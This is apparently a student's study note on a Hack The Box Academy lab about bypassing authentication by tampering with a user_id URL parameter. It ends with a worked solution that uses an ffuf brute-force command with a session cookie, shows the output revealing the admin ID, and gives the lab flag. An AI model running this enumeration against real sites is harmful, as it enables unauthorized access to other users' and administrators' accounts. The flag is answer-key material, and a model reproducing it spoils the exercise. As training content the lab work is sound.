---
aliases:
 - Authentication Bypass via Parameter Modification
sticker: emoji//1faaa
---
An authentication implementation can be flawed if it depends on the presence or value of an HTTP parameter, introducing authentication vulnerabilities. As in the previous section, such vulnerabilities might lead to authentication and authorization bypasses, allowing for privilege escalation.

This type of vulnerability is closely related to authorization issues such as`Insecure Direct Object Reference (IDOR)` vulnerabilities, which are covered in more detail in the [Web Attacks](https://academy.hackthebox.com/module/details/134) module.

---

## Parameter Modification

Let us take a look at our target web application. This time, we are provided with credentials for the user`htb-stdnt`. After logging in, we are redirected to`/admin.php?user_id=183`:

![image](https://academy.hackthebox.com/storage/modules/269/bypass/bypass_param_1.png)

In our web browser, we can see that we seem to be lacking privileges, as we can only see a part of the available data:

 ![](https://academy.hackthebox.com/storage/modules/269/bypass/bypass_param_2.png)

To investigate the purpose of the`user_id` parameter, let us remove it from our request to`/admin.php`. When doing so, we are redirected back to the login screen at`/index.php`, even though our session provided in the`PHPSESSID` cookie is still valid:

![image](https://academy.hackthebox.com/storage/modules/269/bypass/bypass_param_3.png)

Thus, we can assume that the parameter`user_id` is related to authentication. We can bypass authentication entirely by accessing the URL`/admin.php?user_id=183` directly:

![image](https://academy.hackthebox.com/storage/modules/269/bypass/bypass_param_4.png)

Based on the parameter name`user_id`, we can infer that the parameter specifies the ID of the user accessing the page. If we can guess or brute-force the user ID of an administrator, we might be able to access the page with administrative privileges, thus revealing the admin information. We can use the techniques discussed in the`Brute-Force Attacks` sections to obtain an administrator ID. Afterward, we can obtain administrative privileges by specifying the admin's user ID in the`user_id` parameter.

---

## Final Remark

Note that many more advanced vulnerabilities can also lead to an authentication bypass, which we have not covered in this module but are covered by more advanced modules. For instance, Type Juggling leading to an authentication bypass is covered in the [Whitebox Attacks](https://academy.hackthebox.com/module/details/205) module, how different injection vulnerabilities can lead to an authentication bypass is covered in the [Injection Attacks](https://academy.hackthebox.com/module/details/204) and [SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33) modules, and logic bugs that can lead to an authentication bypass are covered in the [Parameter Logic Bugs](https://academy.hackthebox.com/module/details/239) module.

# Question
---
![Pasted image 20250214182725.png](../../../../IMAGES/Pasted%20image%2020250214182725.png)

Once we've authenticated, we can see the following:

![Pasted image 20250214182813.png](../../../../IMAGES/Pasted%20image%2020250214182813.png)

We get assigned an user id in the URL and we're also told we don't have admin privileges, we can brute-force the admin id in the following way:

First, create a wordlist of digits from 1 to 1000:

```bash
seq 1 1000 > digits.txt
```

Now, do the following ffuf command:

```
ffuf -w digits.txt -u "http://IP:PORT/admin.php?user_id=FUZZ" -fr "Could not load admin data. Please check your privileges" -b "PHPSESSID=our_cookie" -ic -c -t 200
```

After a while, we get the following:

```
ffuf -w digits.txt -u "http://94.237.48.103:39253/admin.php?user_id=FUZZ" -fr "Could not load admin data. Please check your privileges" -b "PHPSESSID=9i2epg991j6af0vvgp56v9rnav" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://94.237.48.103:39253/admin.php?user_id=FUZZ
 :: Wordlist : FUZZ: /home/samsepiol/digits.txt
 :: Header : Cookie: PHPSESSID=9i2epg991j6af0vvgp56v9rnav
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter : Regexp: Could not load admin data. Please check your privileges
________________________________________________

372 [Status: 200, Size: 14465, Words: 4165, Lines: 429, Duration: 2667ms]
```

So, admin user's id is `372`, let's log into admin panel:

![Pasted image 20250214183900.png](../../../../IMAGES/Pasted%20image%2020250214183900.png)

Flag is:

```
HTB{63593317426484ea6d270c2159335780}
```
